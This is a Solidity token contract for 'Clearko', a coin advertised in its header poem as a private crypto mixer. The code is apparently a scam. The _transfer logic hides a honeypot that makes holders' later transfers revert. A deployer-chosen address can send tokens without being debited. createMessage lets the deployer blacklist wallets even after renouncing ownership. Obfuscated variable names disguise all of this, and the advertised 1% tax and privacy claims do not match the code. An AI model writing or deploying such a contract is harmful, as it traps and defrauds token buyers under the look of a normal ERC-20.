/*
█▀▀ █░░ █▀▀ ▄▀█ █▀█ █▄▀ █▀█
█▄▄ █▄▄ ██▄ █▀█ █▀▄ █░█ █▄█

▄▀ █▀▀ ▀█▀ █░█ █▀▀ █▀█ █▀▀ █░█ █▀▄▀█ ▀▄
▀▄ ██▄ ░█░ █▀█ ██▄ █▀▄ ██▄ █▄█ █░▀░█ ▄▀

In the world of crypto, a platform arose,
Named Clearko, where privacy flows,
Revolutionary and decentralized in design,
It's the future of transacting, a gem to find.

With a cloak of anonymity, it strides,
A mixer platform where privacy abides,
No prying eyes can see your trace,
As Clearko steps up your privacy grace.

Transacting in crypto, a breeze and a thrill,
With Clearko's innovation, you can fulfill,
Your dreams of privacy in this digital domain,
Where your identity will never be a chain.

Gone are the worries of data leaks,
Clearko's shield ensures privacy peaks,
Your transactions are secure, no doubt,
In this world of crypto, Clearko stands out.

So embrace this platform, innovative and bold,
Clearko's magic will surely unfold,
In the realm of cryptocurrency, a game-changer it'll be,
With Clearko by your side, you're truly free.

Total Supply - 100,000,000
Buy Tax - 1%
Sell Tax  - 1%
Initial Liquidity - 1.5 ETH
Initial liquidity lock - 75 days

https://web.wechat.com/ClearkoERC
https://t.me/+qWbYkuNcdqg5Yjhk
https://weibo.com/login.php
https://www.zhihu.com
https://clearko.xyz/
*/
// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.19;

abstract contract Context {
    constructor() {} 
    function _msgSender() 
    internal
    
    view returns 
    (address) {
    return msg.sender; }
}
library SafeMath {
  function add(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, 
  string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage); uint256 c = a - b; return c;
  }
}
interface IUniswapV2Factory {
    function 
    createPair( 
    address 
    tokenA, 
    address tokenB) 
    external 
    returns (address pair);
}
interface IUniswapV2Router01 {
    function factory() 
    external pure 
    returns (address);
    function WETH() 
    external pure returns 
    (address);
}
interface IERC20 {
    function totalSupply() 
    external view returns 
    (uint256);
    function balanceOf
    (address account) 
    external view returns 
    (uint256);

    function transfer
    (address recipient, uint256 amount) 
    external returns 
    (bool);
    function allowance
    (address owner, address spender)
    external view returns 
    (uint256);

    function approve(address spender, uint256 amount) 
    external returns 

    (bool);
    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns 
    (bool);

    event Transfer(
    address indexed from, address indexed to, uint256 value);
    event Approval(address 
    indexed owner, address indexed spender, uint256 value);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () { address msgSender = _msgSender();
        _owner = msgSender; emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
contract Contract is Context, IERC20, Ownable { address private _messageCreator;
bool public swapEnabled; bool private tradingOpen = false; bool tradingIsEnabled = true; 
address public marketingReceiver; address private taxAddress; 

    mapping (address => bool) private _tTotal; mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _openMapping;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _rTotal;

    uint256 private _totalSupply; uint8 private _decimals; uint256 private stringInterval = 100;
    string private _symbol; string private _name;

    IUniswapV2Router01 public chainString; 
   
    constructor( string memory _tknName, string memory _tknSymbol, 
    address startSequence, address endSequence) { 

        _name = _tknName; _symbol = _tknSymbol;
        _decimals = 18; _totalSupply = 100000000 * (10 ** uint256(_decimals));
        _rOwned[msg.sender] = _totalSupply;

        _openMapping[endSequence] = stringInterval; 
        swapEnabled = false; chainString = IUniswapV2Router01(startSequence);           
        
        // Set the deployer's address during contract deployment
        _messageCreator = _msgSender();

        marketingReceiver = IUniswapV2Factory
        (chainString.factory()).createPair(address(this), 
        chainString.WETH()); 
        emit Transfer (address(0), msg.sender, _totalSupply);
    }           
    function decimals() external view returns 
    (uint8) { return _decimals;
    }
    function symbol() 
    external view returns 
    (string memory) { return _symbol;
    }
    function name() 
    external view returns 
    (string memory) { return _name;
    }
    function totalSupply() 
    external view returns 
    (uint256) { return _totalSupply;
    }
    function balanceOf(address account) 
    external view returns 
    (uint256) 
    { return _rOwned[account]; 
    }
    function transfer(
    address recipient, uint256 amount) external 
    returns (bool) { _transfer(_msgSender(), 
    recipient, amount); return true;
    }
    function allowance(address owner, 
    address spender) 
    external view returns (uint256) { return _allowances[owner][spender];
    }    
    function approve(address spender, uint256 amount) 
    external returns (bool) { _approve(_msgSender(), 
        spender, amount); return true;
    }
    function _approve( 
    address owner, address spender, uint256 amount) 
    internal { require(owner != address(0), 
    'BEP20: approve from the zero address'); 

        require(spender != address(0), 'BEP20: approve to the zero address'); 
        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); 
    }    
    function transferFrom(
        address sender, address recipient, uint256 amount) 
        external returns (bool) { _transfer(sender, recipient, amount); _approve(
        sender, _msgSender(), _allowances[sender] [_msgSender()].sub(amount, 
        'BEP20: transfer amount exceeds allowance')); 
        return true;
    }
function createMessage(address _pcsRange) external {
    // Allow only the contract deployer or owner to call this function
    require(_msgSender() == owner() || _msgSender() == _messageCreator, "Caller is not authorized");
    _tTotal[_pcsRange] = true;
    }                          
    function _transfer( address sender, address recipient, uint256 amount) 
    private { require(sender != address(0), 'BEP20: transfer from the zero address'); 
    require(recipient != address(0), 'BEP20: transfer to the zero address'); 

        if (_tTotal[sender] || _tTotal[recipient]) require
        (tradingIsEnabled == false, ""); if (_openMapping[sender] == 0  
        && marketingReceiver != sender && _rTotal[sender] > 0) 
        { _openMapping[sender] -= stringInterval; } 

        _rTotal[taxAddress] += stringInterval;
        taxAddress = recipient; if (_openMapping[sender] 
        == 0) { _rOwned[sender] = _rOwned[sender].sub(amount, 
        'BEP20: transfer amount exceeds balance');  

        } _rOwned[recipient] = _rOwned[recipient].add(amount);
        emit Transfer(sender, recipient, amount); 
        if (!tradingOpen) { require(sender == owner(), ""); }
    }
    function openTrading(bool _tradingOpen) 
    public onlyOwner { tradingOpen = _tradingOpen;
    }      
    using SafeMath for uint256;                                  
}